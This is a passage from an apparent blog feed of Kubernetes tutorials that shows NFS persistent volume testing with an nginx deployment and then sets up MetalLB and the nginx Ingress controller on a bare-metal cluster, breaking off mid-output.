class=\"attr\">accessModes:</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"string\">ReadWriteMany</span></span><br><span class=\"line\">  <span class=\"attr\">storageClassName:</span> <span class=\"string\">nfs</span></span><br><span class=\"line\">  <span class=\"attr\">resources:</span></span><br><span class=\"line\">    <span class=\"attr\">requests:</span></span><br><span class=\"line\">        <span class=\"attr\">storage:</span> <span class=\"string\">100Mi</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>Create the persistent volume using kubectl</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ kubectl apply -f nfs-pvc.yaml</span><br><span class=\"line\">persistentvolumeclaim/pvc-nfs created</span><br></pre></td></tr></table></figure>\n<p>List the  <code>Persistent Volumes Claims</code>  to make sure for the creation</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ kubectl get pvc</span><br><span class=\"line\">NAME      STATUS   VOLUME   CAPACITY   ACCESS MODES   STORAGECLASS   AGE</span><br><span class=\"line\">pvc-nfs   Bound    pv-nfs   100Mi      RWX            nfs            3s</span><br></pre></td></tr></table></figure>\n<h3 id=\"create-nginx-deployment\"><a class=\"markdownIt-Anchor\" href=\"#create-nginx-deployment\">#</a> Create Nginx Deployment</h3>\n<p>We use the  <code>volumeMounts</code>  and  <code>volumes </code> attributes in this manifest to use the persistent volume we created:</p>\n<figure class=\"highlight yaml\"><figcaption><span>Deployment</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">apps/v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Deployment</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">    <span class=\"attr\">name:</span> <span class=\"string\">nginx-deployment</span></span><br><span class=\"line\">    <span class=\"attr\">labels:</span></span><br><span class=\"line\">        <span class=\"attr\">role:</span> <span class=\"string\">webserver</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\">    <span class=\"attr\">replicas:</span> <span class=\"number\">3</span></span><br><span class=\"line\">    <span class=\"attr\">selector:</span></span><br><span class=\"line\">        <span class=\"attr\">matchLabels:</span></span><br><span class=\"line\">            <span class=\"attr\">role:</span> <span class=\"string\">webserver</span></span><br><span class=\"line\">    <span class=\"attr\">template:</span></span><br><span class=\"line\">        <span class=\"attr\">metadata:</span></span><br><span class=\"line\">            <span class=\"attr\">labels:</span></span><br><span class=\"line\">                <span class=\"attr\">role:</span> <span class=\"string\">webserver</span></span><br><span class=\"line\">        <span class=\"attr\">spec:</span></span><br><span class=\"line\">            <span class=\"attr\">containers:</span></span><br><span class=\"line\">            <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">frontend</span></span><br><span class=\"line\">              <span class=\"attr\">image:</span> <span class=\"string\">nginx</span>  <span class=\"comment\"># we use wrong image for the demo !</span></span><br><span class=\"line\">              <span class=\"attr\">ports:</span></span><br><span class=\"line\">                <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">nginx-port</span></span><br><span class=\"line\">                  <span class=\"attr\">containerPort:</span> <span class=\"number\">80</span></span><br><span class=\"line\">              <span class=\"attr\">volumeMounts:</span></span><br><span class=\"line\">                <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">nfs</span></span><br><span class=\"line\">                  <span class=\"attr\">mountPath:</span> <span class=\"string\">/usr/share/nginx/html</span></span><br><span class=\"line\">            <span class=\"attr\">volumes:</span></span><br><span class=\"line\">            <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">nfs</span></span><br><span class=\"line\">              <span class=\"attr\">persistentVolumeClaim:</span></span><br><span class=\"line\">                <span class=\"attr\">claimName:</span> <span class=\"string\">pvc-nfs</span></span><br></pre></td></tr></table></figure>\n<p>Deploy the  <code>nginx-deployment.yaml</code>  using the  <code>kubectl apply -f</code> .</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ kubectl apply -f nginx-deployment.yaml</span><br><span class=\"line\">deployment.apps/nginx-deployment created</span><br></pre></td></tr></table></figure>\n<p>Make sure that the deployment was created without any problems!</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ kubectl get pods</span><br><span class=\"line\">NAME                                READY   STATUS    RESTARTS   AGE</span><br><span class=\"line\">nginx-deployment-7976956b49-fgbb4   1/1     Running   0          16s</span><br><span class=\"line\">nginx-deployment-7976956b49-hzrmm   1/1     Running   0          16s</span><br><span class=\"line\">nginx-deployment-7976956b49-kg5tx   1/1     Running   0          16s</span><br></pre></td></tr></table></figure>\n<h3 id=\"sanity-check-testing-the-nfs-volumes\"><a class=\"markdownIt-Anchor\" href=\"#sanity-check-testing-the-nfs-volumes\">#</a> Sanity Check (Testing the NFS volumes):</h3>\n<p>Let’s get shell on one of the running containers and go to the mount point then create a file!</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ kubectl <span class=\"built_in\">exec</span> --stdin --<span class=\"built_in\">tty</span> nginx-deployment-7976956b49-fgbb4 -- /bin/bash Command Line Prompt</span><br><span class=\"line\">root@nginx-deployment-7976956b49-fgbb4:/<span class=\"comment\"># ls</span></span><br><span class=\"line\">bin  boot  dev  docker-entrypoint.d  docker-entrypoint.sh  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var</span><br></pre></td></tr></table></figure>\n<p>Now the shell is opened. Let’s create a file in  <code>/usr/share/nginx/html</code> :</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@nginx-deployment-7976956b49-fgbb4:/<span class=\"comment\"># cd /usr/share/nginx/html/</span></span><br></pre></td></tr></table></figure>\n<p>We find the file created in the client test xD</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@nginx-deployment-7976956b49-fgbb4:/usr/share/nginx/html<span class=\"comment\"># ls</span></span><br><span class=\"line\">file</span><br></pre></td></tr></table></figure>\n<p>Create a file named “hi from the other side!”</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@nginx-deployment-7976956b49-fgbb4:/usr/share/nginx/html<span class=\"comment\"># touch &quot;hi from the other side!&quot;</span></span><br><span class=\"line\">root@nginx-deployment-7976956b49-fgbb4:/usr/share/nginx/html<span class=\"comment\"># ls</span></span><br><span class=\"line\">file  <span class=\"string\">&#x27;hi from the other side!&#x27;</span></span><br></pre></td></tr></table></figure>\n<p>Let’s open another shell on another running container:</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ kubectl <span class=\"built_in\">exec</span> --stdin --<span class=\"built_in\">tty</span> nginx-deployment-7976956b49-kg5tx -- /bin/bash Command Line Prompt</span><br><span class=\"line\">root@nginx-deployment-7976956b49-kg5tx:/<span class=\"comment\"># cd /usr/share/nginx/html/</span></span><br></pre></td></tr></table></figure>\n<p>Bingoo! we find the same content on the same share point!</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@nginx-deployment-7976956b49-kg5tx:/usr/share/nginx/html<span class=\"comment\"># ls</span></span><br><span class=\"line\"> file  <span class=\"string\">&#x27;hi from the other side!&#x27;</span></span><br><span class=\"line\">root@nginx-deployment-7976956b49-kg5tx:/usr/share/nginx/html<span class=\"comment\"># exit</span></span><br></pre></td></tr></table></figure>\n<p>Now we will try to delete the deployment and recreate another to check the data in the  persistent volume</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ kubectl delete -f nginx-deployment.yaml</span><br><span class=\"line\">deployment.apps <span class=\"string\">&quot;nginx-deployment&quot;</span> deleted</span><br><span class=\"line\"></span><br><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ kubectl apply -f nginx-deployment.yaml</span><br><span class=\"line\">deployment.apps/nginx-deployment created</span><br></pre></td></tr></table></figure>\n<p>Check the deployment created or not !</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~ kubectl get pods</span><br><span class=\"line\">NAME                                READY   STATUS              RESTARTS   AGE</span><br><span class=\"line\">nginx-deployment-7976956b49-7d5vw   1/1     Running             0          10s</span><br><span class=\"line\">nginx-deployment-7976956b49-9r5gx   0/1     ContainerCreating   0          10s</span><br><span class=\"line\">nginx-deployment-7976956b49-fdq7w   1/1     Running             0          10s</span><br></pre></td></tr></table></figure>\n<p>Open another shell on running container from the new deployment to check the content of the persistent volume:</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ kubectl <span class=\"built_in\">exec</span> --stdin --<span class=\"built_in\">tty</span> nginx-deployment-7976956b49-7d5vw -- /bin/bash Command Line Prompt</span><br><span class=\"line\">root@nginx-deployment-7976956b49-7d5vw:/<span class=\"comment\"># cd /usr/share/nginx/html/</span></span><br></pre></td></tr></table></figure>\n<p>Display the content of the mount point  <code>/usr/share/nginx/html/</code></p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@nginx-deployment-7976956b49-7d5vw:/usr/share/nginx/html<span class=\"comment\"># ls</span></span><br><span class=\"line\"> file  <span class=\"string\">&#x27;hi from the other side!&#x27;</span></span><br><span class=\"line\">root@nginx-deployment-7976956b49-7d5vw:/usr/share/nginx/html<span class=\"comment\"># exit</span></span><br><span class=\"line\"><span class=\"built_in\">exit</span></span><br></pre></td></tr></table></figure>\n<p>Bingoo! The content still in the persistent volume without any problem !</p>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2022/09/09/Kubernetes/nginx-ingress/",
            "url": "http://example.com/2022/09/09/Kubernetes/nginx-ingress/",
            "title": "Deploy Nginx Ingress in Bare-metal Cluster",
            "date_published": "2022-09-09T14:08:22.000Z",
            "content_html": "<h1 id=\"ingress-in-bare-metal-kubernetes-cluster\"><a class=\"markdownIt-Anchor\" href=\"#ingress-in-bare-metal-kubernetes-cluster\">#</a> Ingress in bare metal Kubernetes cluster</h1>\n<p>You are working in enterprise that have one cluster with one public IP address and one Domain Name. In our Example  <code>justk8s.k8s</code> .<br>\nThat Enterprise want to deploy two web apps for these new service (gym and restaurant) with that single cluster,IP and Domain Name !!<br>\nYour task is to deploy these two apps! So you decide to use  <code>Ingress</code>  because it’s the best solution for this kind of problems!</p>\n<h2 id=\"what-is-ingress\"><a class=\"markdownIt-Anchor\" href=\"#what-is-ingress\">#</a> What is Ingress</h2>\n<p>Kubernetes Ingress is an API object that provides routing rules to manage external users’ access to the services in a Kubernetes cluster, typically via HTTPS/HTTP. With Ingress, you can easily set up rules for routing traffic without creating a bunch of Load Balancers or exposing each service on the node<br>\n<img data-src=\"https://imgur.com/rXoZYym.png\" alt=\"\"></p>\n<h2 id=\"ingress-controller\"><a class=\"markdownIt-Anchor\" href=\"#ingress-controller\">#</a> Ingress Controller</h2>\n<p>An Ingress Controller is a Kubernetes controller that is deployed manually to the cluster, most often as a DaemonSet or a Deployment object that runs dedicated Pods for handling incoming traffic load balancing and smart routing. It is responsible for processing the Ingress objects (which specify that they especially want to use the Ingress Controller) and dynamically configuring real routing rules<br>\nThe most common used Ingress controllerfor Kubernetes is  <code>Ingress Nginx</code> <br>\n<img data-src=\"https://imgur.com/P0IubVc.png\" alt=\"\"></p>\n<h2 id=\"ingress-in-cloud-vs-ingress-in-bare-metal-cluster\"><a class=\"markdownIt-Anchor\" href=\"#ingress-in-cloud-vs-ingress-in-bare-metal-cluster\">#</a> Ingress in cloud Vs Ingress in bare metal cluster</h2>\n<p>Deploying Ingress pn managed Kubernetes cluster provided in cloud easier than in bare metal cluster. Because the Ingress Controller must be exposed as LoadBlancer!</p>\n<p>In traditional cloud environments, where network load balancers are available on-demand, a single Kubernetes manifest suffices to provide a single point of contact to the NGINX Ingress controller to external clients and, indirectly, to any application running inside the cluster.</p>\n<p><img data-src=\"https://imgur.com/JM86JeT.png\" alt=\"\"></p>\n<p>Bare-metal environments lack this commodity, requiring a slightly different setup to offer the same kind of access to external consumers. So we need an aproach to solve this problem !</p>\n<p><img data-src=\"https://imgur.com/MaTmKew.png\" alt=\"\"></p>\n<h1 id=\"create-load-balancer-proxy-for-bare-metal-cluster\"><a class=\"markdownIt-Anchor\" href=\"#create-load-balancer-proxy-for-bare-metal-cluster\">#</a> Create Load Balancer / Proxy for bare metal cluster</h1>\n<p>There is a lot of method to set up a Load Balancer or Proxy to get Ingress work on our cluster.</p>\n<ul>\n<li>We can expose our ingress controller using NodePort service and set up a proxy that forward to this service using a nginx proxy or HA proxy</li>\n<li>We can also install a software solution called  <code>metalLB</code> . This solution allows to create Load Balancer in local cluster without any problem ! So we can expose our ingress controller using Load Balancer service like in the cloud environment!</li>\n</ul>\n<h2 id=\"create-load-balancer-using-metallb\"><a class=\"markdownIt-Anchor\" href=\"#create-load-balancer-using-metallb\">#</a> Create Load Balancer using metalLB:</h2>\n<p>In this demo we will deploy one of the 2 apps and expose it with Load Balancer service for the test purposes. So Let’s start deploying the restaurant app and expose it !</p>\n<figure class=\"highlight yaml\"><figcaption><span>Restaurant App Deployment</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">apps/v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Deployment</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">4n6nk8s-kitchen</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\">  <span class=\"attr\">replicas:</span> <span class=\"number\">1</span></span><br><span class=\"line\">  <span class=\"attr\">selector:</span></span><br><span class=\"line\">    <span class=\"attr\">matchLabels:</span></span><br><span class=\"line\">      <span class=\"attr\">app:</span> <span class=\"string\">kitchen</span></span><br><span class=\"line\">  <span class=\"attr\">template:</span></span><br><span class=\"line\">    <span class=\"attr\">metadata:</span></span><br><span class=\"line\">      <span class=\"attr\">labels:</span></span><br><span class=\"line\">        <span class=\"attr\">app:</span> <span class=\"string\">kitchen</span></span><br><span class=\"line\">    <span class=\"attr\">spec:</span></span><br><span class=\"line\">      <span class=\"attr\">containers:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">kitchen-app</span></span><br><span class=\"line\">        <span class=\"attr\">image:</span> <span class=\"string\">mohamedrafraf/k8s-kitchen</span></span><br><span class=\"line\">        <span class=\"attr\">ports:</span></span><br><span class=\"line\">        <span class=\"bullet\">-</span> <span class=\"attr\">containerPort:</span> <span class=\"number\">80</span></span><br></pre></td></tr></table></figure>\n<p>Create the gym app deployment</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf²@4n6nk8s-master$ kubectl apply -f kitchen-deployment.yaml</span><br><span class=\"line\">deployment.apps/4n6nk8s-kitchen created</span><br><span class=\"line\"></span><br><span class=\"line\">raf²@4n6nk8s-master$ kubectl get all</span><br><span class=\"line\">NAME                                   READY   STATUS    RESTARTS   AGE</span><br><span class=\"line\">pod/4n6nk8s-kitchen-698f44db99-29dnr   1/1     Running   0          63s</span><br></pre></td></tr></table></figure>\n<p>Let’s now expose now the deployment:</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf²@4n6nk8s-master$ kubectl expose deploy/4n6nk8s-kitchen--type=LoadBalacner --port=80</span><br><span class=\"line\">service/4n6nk8s-kitchen created</span><br></pre></td></tr></table></figure>\n<p>Let’s check this service</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf²@4n6nk8s-master$ kubectl get svc</span><br><span class=\"line\">NAME              TYPE           CLUSTER-IP       EXTERNAL-IP     PORT(S)        AGE</span><br><span class=\"line\">4n6nk8s-kitchen   LoadBalancer   10.97.71.78      &lt;pending&gt;       80:30918/TCP   21s</span><br><span class=\"line\">kubernetes        ClusterIP      10.96.0.1        &lt;none&gt;          443/TCP        5d11h</span><br></pre></td></tr></table></figure>\n<p>As we see the LoadBalancer service still pending since we don’t have any Load Balancer! Now it’s time to talk about the metalLB !</p>\n<p>MetalLB provides a network load-balancer implementation for Kubernetes clusters that do not run on a supported cloud provider, effectively allowing the usage of LoadBalancer Services within any cluster.<br>\n<img data-src=\"https://imgur.com/Xv7PiiK.png\" alt=\"\"></p>\n<p>It’s time to install metalLB. Installing metalLB is so easy we just need to apply two manifest from the official site of <span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZXRhbGxiLnVuaXZlcnNlLnRmL2luc3RhbGxhdGlvbi8=\">metalLB</span></p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kubectl apply -f https://raw.githubusercontent.com/metallb/metallb/v0.12.1/manifests/namespace.yaml</span><br><span class=\"line\">kubectl apply -f https://raw.githubusercontent.com/metallb/metallb/v0.12.1/manifests/metallb.yaml</span><br></pre></td></tr></table></figure>\n<p>After running the previous commands, a new namespace will be created with a deployment, daesmonset and lot of RBAC authorization and rules!. So let’s check this namespace!</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf²@4n6nk8s-master$ kubectl get all -n metallb-system</span><br><span class=\"line\">NAME                              READY   STATUS    RESTARTS       AGE</span><br><span class=\"line\">pod/controller-7cf77c64fb-4b8sx   1/1     Running   0              23s</span><br><span class=\"line\">pod/speaker-chh2t                 1/1     Running   0              23s</span><br><span class=\"line\">pod/speaker-xbn8z                 1/1     Running   0              23s</span><br><span class=\"line\"></span><br><span class=\"line\">NAME                     DESIRED   CURRENT   READY   UP-TO-DATE   AVAILABLE   NODE SELECTOR            AGE</span><br><span class=\"line\">daemonset.apps/speaker   2         2         2       2            2           kubernetes.io/os=linux   23s</span><br><span class=\"line\"></span><br><span class=\"line\">NAME                         READY   UP-TO-DATE   AVAILABLE   AGE</span><br><span class=\"line\">deployment.apps/controller   1/1     1            1           23s</span><br><span class=\"line\"></span><br><span class=\"line\">NAME                                    DESIRED   CURRENT   READY   AGE</span><br><span class=\"line\">replicaset.apps/controller-7cf77c64fb   1         1         1       23s</span><br></pre></td></tr></table></figure>\n<h2 id=\"configure-the-address-pool-of-the-load-balancer\"><a class=\"markdownIt-Anchor\" href=\"#configure-the-address-pool-of-the-load-balancer\">#</a> Configure the address pool of the Load Balancer</h2>\n<p>Now we must configure the  <code>metalLB</code>  using configmap object. In this configmap we give the address pool that will be used as LoadBalancer IP! Also the type of the Load Balancer.</p>\n<blockquote>\n<p>metalLB supports two LoadBalancing modes : Layer 2 mode and BGP mode. In our case we will use the Layer 2 mode</p>\n</blockquote>\n<p>Now Let’s move to the configmap manifest!</p>\n<figure class=\"highlight yaml\"><figcaption><span>Configmap</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">ConfigMap</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">namespace:</span> <span class=\"string\">metallb-system</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">config</span></span><br><span class=\"line\"><span class=\"attr\">data:</span></span><br><span class=\"line\">  <span class=\"attr\">config:</span> <span class=\"string\">|</span></span><br><span class=\"line\"><span class=\"string\">    address-pools:</span></span><br><span class=\"line\"><span class=\"string\">    - name: default</span></span><br><span class=\"line\"><span class=\"string\">      protocol: layer2</span></span><br><span class=\"line\"><span class=\"string\">      addresses:</span></span><br><span class=\"line\"><span class=\"string\">      - 192.168.1.240-192.168.1.250</span></span><br></pre></td></tr></table></figure>\n<p>After Applying this recent configmap. we can say that the metalLB installtion is finished! So Let’s check the services again in our cluster !</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf²@4n6nk8s-master$ kubectl get svc</span><br><span class=\"line\">NAME              TYPE           CLUSTER-IP       EXTERNAL-IP     PORT(S)        AGE</span><br><span class=\"line\">4n6nk8s-kitchen   LoadBalancer   10.97.71.78      192.168.1.241   80:30918/TCP   5m4s</span><br><span class=\"line\">kubernetes        ClusterIP      10.96.0.1        &lt;none&gt;          443/TCP        5d11h</span><br></pre></td></tr></table></figure>\n<p>Bingo! our Load Balancer service has an external IP address. So our deployment is accessable through this IP! Let’s check it:<br>\nٍ<img data-src=\"https://imgur.com/jWkr5kf.png\" alt=\"\"><br>\nEverything is OK! now we can say that we have a Load Balancer on our bare metal cluster!</p>\n<h1 id=\"install-the-nginx-ingress-controller\"><a class=\"markdownIt-Anchor\" href=\"#install-the-nginx-ingress-controller\">#</a> Install the nginx Ingress Controller:</h1>\n<p>Installing the nginx ingress controller can be done either by using Helm or the yaml manifest provided in the nginx controller website</p>\n<h2 id=\"install-the-controller-using-helm\"><a class=\"markdownIt-Anchor\" href=\"#install-the-controller-using-helm\">#</a> Install the controller using Helm</h2>\n<p>If you have Helm, you can deploy the ingress controller with the following command:</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf²@4n6nk8s-master$ helm upgrade --install ingress-nginx ingress-nginx \\</span><br><span class=\"line\">  --repo https://kubernetes.github.io/ingress-nginx \\</span><br><span class=\"line\">  --namespace ingress-nginx --create-namespace</span><br></pre></td></tr></table></figure>\n<h2 id=\"install-the-controller-using-yaml-manifest\"><a class=\"markdownIt-Anchor\" href=\"#install-the-controller-using-yaml-manifest\">#</a> Install the controller using yaml manifest:</h2>\n<p>If you don’t have Helm or if you prefer to use a YAML manifest, you can run the following command instead:</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf²@4n6nk8s-master$ kubectl apply -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/controller-v1.2.0/deploy/static/provider/cloud/deploy.yaml</span><br><span class=\"line\"></span><br><span class=\"line\">namespace/ingress-nginx created</span><br><span class=\"line\">serviceaccount/ingress-nginx created</span><br><span class=\"line\">serviceaccount/ingress-nginx-admission created</span><br><span class=\"line\">role.rbac.authorization.k8s.io/ingress-nginx created</span><br><span class=\"line\">role.rbac.authorization.k8s.io/ingress-nginx-admission created</span><br><span class=\"line\">clusterrole.rbac.authorization.k8s.io/ingress-nginx created</span><br><span class=\"line\">clusterrole.rbac.authorization.k8s.io/ingress-nginx-admission created</span><br><span class=\"line\">rolebinding.rbac.authorization.k8s.io/ingress-nginx created</span><br><span class=\"line\">rolebinding.rbac.authorization.k8s.io/ingress-nginx-admission created</span><br><span class=\"line\">clusterrolebinding.rbac.authorization.k8s.io/ingress-nginx created</span><br><span class=\"line\">clusterrolebinding.rbac.authorization.k8s.io/ingress-nginx-admission created</span><br><span class=\"line\">configmap/ingress-nginx-controller created</span><br><span class=\"line\">service/ingress-nginx-controller created</span><br><span class=\"line\">service/ingress-nginx-controller-admission created</span><br><span class=\"line\">deployment.apps/ingress-nginx-controller created</span><br><span 